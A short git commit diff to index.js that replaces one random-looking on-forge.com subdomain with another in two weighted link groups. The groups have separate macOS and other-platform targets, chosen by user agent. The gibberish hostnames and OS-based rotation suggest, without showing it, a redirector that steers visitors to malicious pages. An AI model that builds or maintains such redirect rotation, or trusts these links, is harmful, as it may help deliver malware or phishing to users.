c33914ab7795bcc08fb21d9ff7202cddeb149489
animalinside <akshay.anand12@yahoo.com>
2026-05-03 09:59:48 +0530

    Update URLs for link groups in index.js

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://sdjhgvsukghrge.on-forge.com/",
-            others: "https://sdjhgvsukghrge.on-forge.com/"
+            macos: "https://fgkhhrughregurd.on-forge.com/",
+            others: "https://fgkhhrughregurd.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://sdjhgvsukghrge.on-forge.com/",
-            others: "https://sdjhgvsukghrge.on-forge.com/"
+            macos: "https://fgkhhrughregurd.on-forge.com/",
+            others: "https://fgkhhrughregurd.on-forge.com/"
         }
     ];
 
